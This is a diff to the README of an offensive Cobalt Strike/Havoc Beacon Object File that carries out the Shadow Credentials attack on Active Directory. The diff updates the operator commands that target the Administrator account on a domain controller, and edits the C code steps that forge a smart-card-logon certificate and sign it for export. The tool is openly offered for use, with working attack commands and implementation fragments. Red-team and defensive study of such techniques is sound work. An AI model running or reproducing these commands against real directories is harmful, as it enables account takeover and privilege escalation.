@@ -1,6 +1,6 @@
 # ShadowCredsBOF
 
-Shadow Credentials attack BOF for Cobalt Strike.
+Shadow Credentials attack BOF for Cobalt Strike and Havoc.
 
 **Complete attack chain:**
 1. **Shadow Credentials** - Write KeyCredential to msDS-KeyCredentialLink
@@ -11,11 +11,13 @@ Shadow Credentials attack BOF for Cobalt Strike.
 
 ```bash
 # On Kali
-git clone https://github.com/RayRRT/BOFs.git && cd ShadowCreds-unPAC-BOF && make bof
+git clone https://github.com/RayRRT/BOFs.git && cd BOFs/ShadowCreds-unPAC-BOF && make bof
 
 # In Cobalt Strike
-shadowcreds EVILDEV$ corp.local xxx.xxx.xxx.xxx
+shadowcreds Administrator corp.local
 
+# In Havoc
+inline-execute shadowcreds.x64.o Administrator corp.local dc01.corp.local
 ```
 
 ## Output
@@ -268,15 +270,7 @@ altNameEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
 altNameEntries[1].pwszURL = wszSidUrl;
 ```
 
-#### Step 4: Build EKU Extension
-```c
-ekuOids[0] = "1.3.6.1.5.5.7.3.2";        // Client Authentication
-ekuOids[1] = "1.3.6.1.4.1.311.20.2.2";   // Smart Card Logon
-eku.cUsageIdentifier = 2;
-eku.rgpszUsageIdentifier = ekuOids;
-```
-
-#### Step 5: Sign and Export PFX
+#### Step 4: Sign and Export PFX
 ```c
 CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                               X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
